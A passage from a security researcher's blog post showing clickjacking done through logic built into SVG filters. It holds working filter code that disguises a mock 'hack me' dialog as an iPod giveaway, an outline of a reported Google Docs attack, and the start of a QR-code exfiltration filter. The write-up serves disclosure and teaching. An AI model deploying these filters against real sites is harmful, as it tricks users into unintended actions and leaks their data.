&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>&quot;dialogBtn&quot;</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-1</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>L</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- C (checkbox checked) --&gt;</sx-c>
<sx-t>&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#0B57D0</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>dialogBtn</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>4</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-1</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-1</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
               <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;1 1 1 0 0
                       1 1 1 0 0
                       1 1 1 0 0
                       1 1 1 1 0&quot;</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>C</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- R (red text visible) --&gt;</sx-c>
<sx-t>&lt;feMorphology</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>erode</sx-v> <sx-r>radius</sx-r><sx-t>=</sx-t><sx-v>3</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;17px&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;150px&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>redtext</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
               <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 1 0 0
                       0 0 0 0 0
                       0 0 0 0 0
                       0 0 1 0 0&quot;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>2</sx-v> <sx-r>k3</sx-r><sx-t>=</sx-t><sx-v>-5</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>redtext</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>R</sx-v>
               <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;1 0 0 0 0
                       1 0 0 0 0
                       1 0 0 0 0
                       1 0 0 0 1&quot;</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Attack overlays --&gt;</sx-c>
<sx-t>&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>R</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&quot;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>end.png</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>button1.png</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>out</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>C</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&quot;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>button2.png</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>checkbox.png</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>loadedGraphic</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>L</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&quot;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>loadedGraphic</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>loading.png</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>dialogGraphic</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>D</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&quot;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>dialogGraphic</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>out</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<DIV><fake-frame class="logic-gate-attack" style="filter:url(#logic-gate-filter)">
  <p style="font-size:200%">Securify</p>
  <p>Welcome to this secure application!</p>
  <label><g-button style="position:absolute; top: 96px; left: 16px" primary>Hack me</g-button><input type="checkbox" id="hackmecheck2"></label>
  <div class="hackmedialog"><div>
    <p>Hack confirmation</p>
    <p>Are you sure you'd like to get hacked?</p>
    <label style="position:absolute; top: 74px; left: 12px"><input id="hackmesure2" type="checkbox">I am 100% sure</label>
    <label for="hackmecheck2"><g-button style="position:absolute; top: 96px; left:190px">No</g-button></label>
    <label><g-button style="position:absolute; top: 96px; left: 265px" primary>Yes</g-button><input type="checkbox" id="hackmeyes2"></label>
    <span>⌛</span>
  </div></div>
  <p class="havebeenhacked" style="position:absolute;top:145px;font-weight:600;color:red"><label for="hackmeyes2">You have been hacked!<br><em style="font-size:75%;color:#888">(click to go back)</em></label></p>
  <div id="lgDebugMode"></div>
</fake-frame></DIV>

<div><label><input type="checkbox" id="lgDebugCheck">Show attack with transparency</label></div>

<svg
  class="effect"
  width="420"
  height="220"
  viewBox="0 0 420 220"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="logic-gate-filter">
      <!-- util -->
      <feTile x="15px" y="5px" width="2" height="2" in=SourceGraphic />
      <feTile x="0" y="0" width="100%" height="100%" />
      <feColorMatrix type=matrix result=debugEnabled
        values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
      <feFlood flood-color=#FFF result=white />
      <!-- attack imgs -->
      <feImage xlink:href="data:image/svg+xml,<svg width='420' height='220' viewBox='0 0 420 220' fill='%23333' style='font-size-adjust: 0.478;font: 16px Charter, %22Bitstream Charter%22, %22Sitka Text%22, Cambria, serif' xmlns='http://www.w3.org/2000/svg'> <rect x='2' y='2' width='416' height='216' /> <text x='20' y='35' fill='%23FFF'>Win a free iPod!</text> <rect x='18' y='98' width='109' height='40' fill='%238CFFDB' rx='20' /> <text x='41' y='123' fill='%23000'>Sign up!</text></svg>" x=0 y=0 width=420 height=220 result=button1.png></feImage>
      <feImage xlink:href="data:image/svg+xml,<svg width='420' height='220' viewBox='0 0 420 220' fill='%23333' style='font-size-adjust: 0.478;font: 16px Charter, %22Bitstream Charter%22, %22Sitka Text%22, Cambria, serif' xmlns='http://www.w3.org/2000/svg'> <rect x='2' y='2' width='416' height='216' /> <text x='20' y='35' fill='%23FFF'>Win a free iPod!</text> <rect x='18' y='98' width='109' height='40' fill='%238CFFDB' rx='20' /> <text x='41' y='123' fill='%23000'>Sign up!</text> <rect x='2' y='2' width='416' height='216' fill='%230009' /> <rect x='34' y='34' width='352' height='152' fill='%23FFF' rx='8' /> <text x='171' y='115' fill='%23000'>Loading...</text></svg>" x=0 y=0 width=420 height=220 result=loading.png></feImage>
      <feImage xlink:href="data:image/svg+xml,<svg width='420' height='220' viewBox='0 0 420 220' fill='%23333' style='font-size-adjust: 0.478;font: 16px Charter, %22Bitstream Charter%22, %22Sitka Text%22, Cambria, serif' xmlns='http://www.w3.org/2000/svg'> <rect x='2' y='2' width='416' height='216' /> <text x='20' y='35' fill='%23FFF'>Win a free iPod!</text> <rect x='18' y='98' width='109' height='40' fill='%238CFFDB' rx='20' /> <text x='41' y='123' fill='%23000'>Sign up!</text> <rect x='2' y='2' width='416' height='216' fill='%230009' /> <rect x='34' y='34' width='352' height='152' fill='%23FFF' rx='8' /> <rect x='50' y='112' width='12' height='12' fill='%230000' stroke='%23000' rx='8' /> <rect x='299' y='130' width='73' height='40' fill='%23444' rx='20' /> <text x='52' y='64' style='font-size:150%' fill='%23000'>Win a free iPod!</text> <text x='52' y='88' fill='%23000'>To join the giveaway you must agree with</text> <text x='52' y='104' fill='%23000'>our Terms and Conditions.</text> <text x='64' y='123' fill='%23000'>I agree to terms</text> <text x='308' y='155' fill='%23AAA'>Sign up</text></svg>" x=0 y=0 width=420 height=220 result=checkbox.png></feImage>
      <feImage xlink:href="data:image/svg+xml,<svg width='420' height='220' viewBox='0 0 420 220' fill='%23333' style='font-size-adjust: 0.478;font: 16px Charter, %22Bitstream Charter%22, %22Sitka Text%22, Cambria, serif' xmlns='http://www.w3.org/2000/svg'> <rect x='2' y='2' width='416' height='216' /> <text x='20' y='35' fill='%23FFF'>Win a free iPod!</text> <rect x='18' y='98' width='109' height='40' fill='%238CFFDB' rx='20' /> <text x='41' y='123' fill='%23000'>Sign up!</text> <rect x='2' y='2' width='416' height='216' fill='%230009' /> <rect x='34' y='34' width='352' height='152' fill='%23FFF' rx='8' /> <rect x='50' y='112' width='12' height='12' fill='%230000' stroke='%23000' rx='8' /> <rect x='52' y='114' width='8' height='8' fill='%23000' rx='8' /> <rect x='299' y='130' width='73' height='40' fill='%238CFFDB' rx='20' /> <text x='52' y='64' style='font-size:150%' fill='%23000'>Win a free iPod!</text> <text x='52' y='88' fill='%23000'>To join the giveaway you must agree with</text> <text x='52' y='104' fill='%23000'>our Terms and Conditions.</text> <text x='64' y='123' fill='%23000'>I agree to terms</text> <text x='308' y='155' fill='%23000'>Sign up</text></svg>" x=0 y=0 width=420 height=220 result=button2.png></feImage>
      <feImage xlink:href="data:image/svg+xml,<svg width='420' height='220' viewBox='0 0 420 220' fill='%23333' style='font-size-adjust: 0.478;font: 16px Charter, %22Bitstream Charter%22, %22Sitka Text%22, Cambria, serif' xmlns='http://www.w3.org/2000/svg'> <rect x='2' y='2' width='416' height='216' /> <text x='20' y='35' style='font-size:150%' fill='%23FFF'>Yay!</text> <text x='20' y='60' fill='%23FFF'>You've been signed up for our iPod giveaway!</text></svg>" x=0 y=0 width=420 height=220 result=end.png></feImage>
      <!-- D (dialog visible) -->
      <feTile x="4px" y="4px" width="4" height="4" in=SourceGraphic />
      <feTile x="0" y="0" width="100%" height="100%" />
      <feBlend mode=difference in2=white />
      <feComposite operator=arithmetic k2=100 k4=-1 result=D />
      <!-- L (dialog loaded) -->
      <feTile x="313px" y="141px" width="4" height="4" in=SourceGraphic />
      <feTile x="0" y="0" width="100%" height="100%" result="dialogBtn" />
      <feBlend mode=difference in2=white />
      <feComposite operator=arithmetic k2=100 k4=-1 result=L />
      <!-- C (checkbox checked) -->
      <feFlood flood-color=#0B57D0 />
      <feBlend mode=difference in=dialogBtn />
      <feComposite operator=arithmetic k2=4 k4=-1 />
      <feComposite operator=arithmetic k2=100 k4=-1 />
      <feColorMatrix type=matrix
              values="1 1 1 0 0
                      1 1 1 0 0
                      1 1 1 0 0
                      1 1 1 1 0" />
      <feBlend mode=difference in2=white result=C />
      <!-- R (red text visible) -->
      <feMorphology operator=erode radius=3 in=SourceGraphic />
      <feTile x="17px" y="150px" width="4" height="4" />
      <feTile x="0" y="0" width="100%" height="100%" result=redtext />
      <feColorMatrix type=matrix
        values="0 0 1 0 0
                0 0 0 0 0
                0 0 0 0 0
                0 0 1 0 0" />
      <feComposite operator=arithmetic k2=2 k3=-5 in=redtext />
      <feColorMatrix type=matrix
        values="1 0 0 0 0
                1 0 0 0 0
                1 0 0 0 0
                1 0 0 0 1" result=R />
      <!-- Attack overlays -->
      <feColorMatrix type=matrix in=R
        values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
      <feComposite in=end.png operator=in />
      <feBlend in2=button1.png />
      <feBlend in2=SourceGraphic result=out />
      <feColorMatrix type=matrix in=C
        values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
      <feComposite in=button2.png operator=in />
      <feBlend in2=checkbox.png result=loadedGraphic />
      <feColorMatrix type=matrix in=L
        values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
      <feComposite in=loadedGraphic operator=in />
      <feBlend in2=loading.png result=dialogGraphic />
      <feColorMatrix type=matrix in=D
        values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
      <feComposite in=dialogGraphic operator=in />
      <feBlend in2=out result=out />
      <!-- Show original -->
      <feComposite operator=arithmetic k2=0.5 k3=0.5 in=SourceGraphic />
      <feComposite in2=debugEnabled operator=in />
      <feBlend in2=out result=out />
      <!-- Debug view -->
      <feTile x="3px" y="209px" width="8" height="8" in=D />
      <feBlend in2=out result=out />
      <feTile x="12px" y="209px" width="8" height="8" in=L />
      <feBlend in2=out result=out />
      <feTile x="21px" y="209px" width="8" height="8" in=C />
      <feBlend in2=out result=out />
      <feTile x="30px" y="209px" width="8" height="8" in=R />
      <feBlend in2=out result=out />
    </filter>
</svg>

Play around with this and see just how much more convincing it is as an attack. And we could easily make it better by, for example, adding some extra logic to also add hover visuals to the buttons. The demo has debug visuals for the four inputs (D, L, C, R) in the bottom left as squares to make it easier to understand what's going on.

But yeah, that's how you can make complex and long clickjacking attacks that have not been realistic with the traditional clickjacking methods.

I kept this example here pretty short and simple, but real-world attacks can be a lot more involved and polished.

In fact...

## The Docs bug

I've actually managed to pull off this attack against Google Docs!

Take a look at the demo videos [here](https://infosec.exchange/@rebane2001/115265287713185877) (alt links: [bsky](https://bsky.app/profile/rebane2001.bsky.social/post/3lzo4euxo5s2p), [twitter](https://twitter.com/rebane2001/status/1971213061580259814)).

What this attack does is:
- Makes the user click on the "Generate Document" button
- Once pressed, detects the popup and shows a textbox for the user to type a "captcha" into
  - The textbox starts off with a gradient animation, which must be handled
  - The textbox has focus states, which must also be present in the attack visuals, so they must be detected by the background color of the textbox
  - The textbox has grey text for both a placeholder AND suggestions, which must be hidden with the technique discussed earlier
- Once the captcha is typed, makes the user seemingly click on a button (or press enter), which causes a suggested Docs item to be added into the textbox
  - This item must be detected by looking for its background color in the textbox
- Once the item is detected, the textbox must be hidden and another button must be shown instead
  - Once that button is clicked, a loading screen appears, which must be detected
- If the loading screen is present, or the dialog is not visible and the "Generate Document" button is not present, the attack is over and the final screen must be shown

In the past, individual parts of such an attack could've been pulled off through traditional clickjacking and some basic CSS, but the entire attack would've been way too long and complex to be realistic. With this new technique of running logic inside SVG filters, such attacks become realistic.

Google VRP awarded me <span style="font-weight:900;color:green;text-shadow:1px 1px 2px #FFF">$3133.70</span> for the find. That was, of course, [right before](https://infosec.exchange/@rebane2001/115349916882356842) they introduced a novelty bonus for new vulnerability classes. Hmph![^hmph]

<!--
Should be something like opening the settings, scrolling down to the desired item, selecting it, then selecting the thing on the side and typing something in.

maybe add in a loading spinner or something too that we can pixel detect

maybe it could be like generating an app password or something like that

the scrolling down could be a license agreement spoof
the typing something should be a captcha spoof


-->

## The QR attack

Something I see in online discussions often is the insistence on QR codes being dangerous. It kind of rubs me the wrong way because QR codes are not any more dangerous than links.

I don't usually comment on this too much because it's best to avoid suspicious links, and the same goes for QR codes, but it does nag me to see people make QR codes out to be this evil thing that can somehow immediately hack you.

I turns out though, that my SVG filters attack technique can be applied to QR codes as well!

The example from earlier in the blog with retyping a code becomes impractical once the user realizes they're typing something they shouldn't. We can't stuff the data we exfiltrate into a link either, because an SVG filter cannot create a link.

But since an SVG filter can run logic and provide visual output, perhaps we could generate a QR code with a link instead?

### Creating the QR

Creating a QR code within an SVG filter is easier said than done however. We can shape binary data into the shape of a QR code by using `feDisplacementMap`, but for a QR code to be scannable it also needs error correction data.

QR codes use [Reed-Solomon error correction](https://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction), which is some fun math stuff that's a bit more advanced than a simple checksum. It does math with polynomials and stuff and that is a bit annoying to reimplement in an SVG.

Luckily for us, I've faced the same problem before! Back in 2021 I was the first person[^firstqr] to [make a QR code generator in Minecraft](https://www.planetminecraft.com/project/rebane-s-qr-code-generator/), so I've already figured out the things necessary.

In my build I pre-calculated some lookup tables for the error correction, and used those instead to make the build simpler - and we can do the same with the SVG filter.

This post is already getting pretty long, so I'll leave figuring out how this filter works as an exercise to the reader ;).

<DIV><art-frame class="qr-demo" flex center style="padding: 16px"><qr-demo>
<qr-gen class="force-visibility">
  <qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter><qr-filter>
    <div style="width:256px;height:256px;background:#000;position:relative">
        <div style="width:8px;height:216px;translate: 0 0px;filter:url(#qrBase)"></div>
  <qr-bit b1 d1></qr-bit>
  <qr-bit b2 d1></qr-bit>
  <qr-bit b3 d1></qr-bit>
  <qr-bit b4 d1></qr-bit>
  <qr-bit b1 d2></qr-bit>
  <qr-bit b2 d2></qr-bit>
  <qr-bit b3 d2></qr-bit>
  <qr-bit b4 d2></qr-bit>
  <qr-bit b1 d3></qr-bit>
  <qr-bit b2 d3></qr-bit>
  <qr-bit b3 d3></qr-bit>
  <qr-bit b4 d3></qr-bit>
  <qr-bit b1 d4></qr-bit>
  <qr-bit b2 d4></qr-bit>
  <qr-bit b3 d4></qr-bit>
  <qr-bit b4 d4></qr-bit>
    </div>
  </qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter></qr-filter>
</qr-gen>
</qr-demo><div class="hovertoseeqr">Hover to see QR</div></art-frame></DIV>

<style type="text/css">
  qr-gen {
    display: block;
    width:256px;
    height:256px;
    filter: url(#combino);
    qr-filter {
      display:block;
      width:256px;
      height:256px;
/*      filter:url(#qr3);*/
    }
    image-rendering: pixelated;
  }
  .qr-demo {
    box-sizing: border-box;
    .hovertoseeqr { 
      position: absolute;
      background: #8CFFDB;
      border-radius: 4px;
      padding: 8px 12px;
      user-select: none;
      pointer-events: none;
      opacity: 1;
      transition: opacity 0.2s;
    }
    qr-demo {
      filter: blur(3px);
      transition: filter 0.2s;
    }
    qr-bit {
      opacity: 0;
    }
    &:focus-within, &:hover, &:has(:hover), &:active {
      .hovertoseeqr {
        opacity: 0;
      }
      qr-demo {
        filter: none;
      }
      qr-bit {
        opacity: 1;
      }
      qr-filter {
        filter:url(#qr3);
      }
    }
  }
</style>
<svg
  class="effect"
  width="256"
  height="256"
  viewBox="0 0 256 256"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="qrBase" color-interpolation-filters=sRGB>
      <feImage xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAADYCAIAAABOcaU6AAAAWUlEQVR4nO2TwQrAMAxCo///z9lhp4FUU3YYZe/WRhEbWmVBd3uVU+Ixw33iNAjKt0qQPpYAKh2beeOny/MYz6BK00t2l5qDRZWDfDmI90B/Of4Pr3b/+SIX0ipi7T7I/bcAAAAASUVORK5CYII=" x=0 y=0 width="2" height="216" />
    </filter>
    <filter id="qr3" color-interpolation-filters="sRGB">
      <!-- polynomials table for qr -->
      <feImage xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQEAAABICAIAAAB5rte6AAAFmklEQVR4nO1d0ZLkIAiUq/n/X+bqarM5E4MBBxJQeJh1nbZtUKJmMrulpKWlpaWlpaWlpaWtavC2gNUN3xaQFj4Hos+h8ANQwg/BJ3qArOdQ9AHOIdDPATQOkLXD0fVP4AI60/+REoFSx8n/ehfJf5EDSBBRjROvi3coCRfAf+oqaN7O+mfqHUrCderxt5Svb72+LgDXft3Wh30wTilCLR/ASLh+Wy1+dKZHyg/+JK02BP9+nJaCvbLGnWr4eC0eDmdE/YpSZw1RMdZP3heCX8RPoc0kbDAinoEbXlS/Ij0D/or0FCV/FbuwDhEYD7H1FP1I5wFHHCWI6cwlj7RfCs+Z39SEY/ZL+XXb7wQuQMApZP45sbVxLpDUhYGDp8pa/f7YBC7ENfMciD5HpRsGh5ZDoP+sROiLygMTwtpyCIrqEPypZbXnmJ+aNhepeikPhefzUNr4nDtYxMOPya0e6y6sQ2Q9xGN4Ps9WqHHUVaHFlG4W9nkovLUeKT8Y68H4LkSfQn/w+B61uFAYajHl8HA4LfRo6dTSM4ELaMxvqif8faHoxtzjcu7NS3koPBjrkfJbxyd8DkDwCTSBQfAhOJyJ+2dN6mDUtuIcwqjDDVUv5eFwcnjG/OXHE+O7EH0KbYW6vzZvasxpI5t4FbxDSbgMfrsOnQ4KAw9UU29J8VIea35rPQ+EyFtIUUmnlp7DolGnTm0XqdM2FvJQeDDWI+UvxnoGuvbmAhjzF2M9/++N7juk0z4JrpLmtIK3j6rWsEueum0No3iofgf0iPyV6pH6W+xDJHUZhCG1DpH1EEOU6zGnrQc9Un7wJ2m1ISC/T9ymCEXRdtOy9Xk4h5gWQ7Xt80j9pXzh9Mv3N4egvDgE9ZpCLUydvcFtWw5mZX5cz+XijP//OkBdnE71nQenLuuph6Xa9evy1vJtW2t+6/js5YEmTEneQopC/uGQ8ofs2k4tb40kSv4h/glcwCj80r3QA3sD04XPm34j2TOFqBjr33Kj/qVfLmxk/yCixS8te/MX/ElabQgOOWGR9NYXlej8eSYub/OT60ARJtlbeOnFwKdfDiWB2fXbm1/b58TtSbldo+tk4uNrTN2WumMgxWvxUHitOFD4MoULGHkKketAbhbHymN6cgjKe0NwGIjT6nyia42DRyUeCg9KPB70T+ACfsHzmv524cjyk+XXBZTly6CV3NJk1eJHZ3qk/J11IIegNQv+fGbuxl/KF06/fH9zCMp7Q0DlD2lUglIGxvzFmZ4H/PXmQgkeUpKfsxhZdIzO8G/FJ5ALYIwvxv2anweibxbBWA/GdyH6FPo8uTmTbi4t9Ej5reMD9vt7KR6M9WhNFS09/37skapDVr9eVho91OENb93vAyGKEmpkaLboF6jE0qpvk1K3L5hC/wQuYFj9h0tRCVj2o2Ss/LoA/LrsR8lY+fC3Fi3K1B/H0yrbKa/NzosHQvRMoNDMC2vlh70QBCwXl6oGvPAgA4bKJXrwO+cJlVdT8gdeJ+jCQxjRcXxOC+a97bKMTCwouP4BPauFyFo/mBMZ86MzPVr8gVwAZ3qk/IfPyFoo/0ZY/W6f8xueFi/lofCUzn799/2ifRe6PNDgx1zm+9uv/77fw3cp6/NyfTavx6ku15jTu5df5DuNN+f2DudLd9H1S5tIJUldLsKQRtcv3gtp7UkS38c7lIST4g//j4yzDCVeF4+88ePsChI/hgfdfW3ix/AOJeEy+G1vdNp47b9m/QP1DiXhSvWHvZD0rzFnvW69Q0mwQL3580JZvn2eyvp5oSzf3jjaqqJu5oLo7OMdSgI2vkSfQtTzJJeVdUsmXovnLfwD/Vp34S2kKMRb9wvSBKLKUh4KD0o8sfRP4ALG1Y/CxJImnDRxF+SfwAUMzp+WlpaWlpaWlpaWVta0v03L/OuYEEVvAAAAAElFTkSuQmCC" x=0 y=0 width=257 height=72 result=tbl></feImage>
      <!-- Take bits 4-11 and use it as an offset into the table -->
      <!-- 8 bits into 1 byte - Note that if the result is 0x00, it gets output as 0x01 -->
      <feTile x=0 y=11 width=1 height=1 in=SourceGraphic color-interpolation-filters="linearRGB" />
      <feTile x=0 y=0 width=1 height=12 />
      <feComposite operator=arithmetic k2=0.50196 k3=0 result=out />
      <!---->
      <feTile x=0 y=10 width=1 height=1 in=SourceGraphic color-interpolation-filters="linearRGB" />
      <feTile x=0 y=0 width=1 height=12 />
      <feComposite operator=arithmetic k2=0.50196 k3=0.50196 in2=out result=out />
      <!---->
      <feTile x=0 y=9 width=1 height=1 in=SourceGraphic color-interpolation-filters="linearRGB" />
      <feTile x=0 y=0 width=1 height=12 />
      <feComposite operator=arithmetic k2=0.50196 k3=0.50196 in2=out result=out />
      <!---->
      <feTile x=0 y=8 width=1 height=1 in=SourceGraphic color-interpolation-filters="linearRGB" />
      <feTile x=0 y=0 width=1 height=12 />
      <feComposite operator=arithmetic k2=0.50196 k3=0.50196 in2=out result=out />
      <!---->
      <feTile x=0 y=7 width=1 height=1 in=SourceGraphic color-interpolation-filters="linearRGB" />
      <feTile x=0 y=0 width=1 height=12 />
      <feComposite operator=arithmetic k2=0.50196 k3=0.50196 in2=out result=out />
      <!---->
      <feTile x=0 y=6 width=1 height=1 in=SourceGraphic color-interpolation-filters="linearRGB" />
      <feTile x=0 y=0 width=1 height=12 />
      <feComposite operator=arithmetic k2=0.50196 k3=0.50196 in2=out result=out />
      <!---->
      <feTile x=0 y=5 width=1 height=1 in=SourceGraphic color-interpolation-filters="linearRGB" />
      <feTile x=0 y=0 width=1 height=12 />
      <feComposite operator=arithmetic k2=0.50196 k3=0.50196 in2=out result=out />
      <!---->
      <feTile x=0 y=4 width=1 height=1 in=SourceGraphic color-interpolation-filters="linearRGB" />
      <feTile x=0 y=0 width=1 height=12 />
      <feComposite operator=arithmetic k2=0.50196 k3=0.50196 in2=out result=out />
      <feTile x=0 y=0 width=100% height=100% result=out />
      <!-- To red -->
      <feColorMatrix type=matrix
        values="1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1" />
      <!-- Fetch value from lookup table -->
      <feDisplacementMap
        in="tbl"
        scale="256"
        xChannelSelector="R"
        yChannelSelector="G" />
      <feColorMatrix type=matrix
        values="1 0 0 0 0 1 0 0 0 0 1 0 0 0 0 0 0 0 0 1" />
      <feOffset dx="-128" dy="-128" result=b />
      <feTile x=0 y=0 width=1 height=72 />
      <!-- Apply XOR -->
      <feBlend mode=difference in2=SourceGraphic />
      <!-- Shift data -->
      <feOffset dx="0" dy="-8" />
      <feTile x=0 y=0 width=1 height=100% />
      <feBlend in2=SourceGraphic />
      <feTile x=0 y=0 width=100% height=100% />
    </filter>
    <filter id=combino  color-interpolation-filters="sRGB">
